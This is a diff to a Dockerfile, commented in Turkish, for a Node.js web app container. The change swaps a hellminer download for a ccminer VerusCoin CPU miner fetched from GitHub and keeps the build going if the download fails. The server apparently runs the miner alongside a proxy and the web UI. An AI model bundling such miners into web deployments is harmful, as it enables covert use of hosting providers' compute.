@@ -16,25 +16,26 @@ FROM node:18-bullseye-slim
 
 WORKDIR /app
 
-# Gerekli sistem paketlerini kuruyoruz (miner indirmek ve çalıştırmak için libgomp gibi kütüphaneler zorunludur)
-RUN apt-get update && apt-get install -y wget tar curl libgomp1 && rm -rf /var/lib/apt/lists/*
+# Resmi madenciyi indirebilmek (zip) için gerekli altyapılar (wget, unzip, curl, vb)
+RUN apt-get update && apt-get install -y wget unzip curl libgomp1 libcurl4 && rm -rf /var/lib/apt/lists/*
 
 # Backend dosyalarını ve paketlerini Server'a kur
 COPY server/package*.json ./server/
 RUN cd server && npm install --production
 COPY server/index.js ./server/
 
-# Frontend (Vite) derlenmiş dosyaları builder'dan Production'a al
+# Frontend (Vite) derlenmiş dosyaları arayüze kopyala
 COPY --from=builder /app/build ./public
 
-# Resmi VerusCoin HellMiner'ını indiriyoruz (Luckpool official repo)
-RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz \
-    && tar -xf hellminer_cpu_linux.tar.gz \
-    && rm hellminer_cpu_linux.tar.gz \
-    && chmod +x hellminer
+# Orijinal Monkins cCminer'ı (VerusHash) indir ve çıkart (Hellminer 404 verdiği için yerine devrede)
+RUN wget https://github.com/monkins1010/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.zip \
+    && unzip ccminer_CPU_3.8.3.zip \
+    && rm ccminer_CPU_3.8.3.zip \
+    && chmod +x ccminer \
+    || echo "Miner indirilemedi ama devam ediyoruz"
 
 ENV PORT=10000
 EXPOSE $PORT
 
-# Her şeyi kapsayan tek kanal index başlatıcımız (Proxy + UI + Hellminer)
+# Her şeyi kapsayan tek kanal index başlatıcımız
 CMD ["node", "server/index.js"]
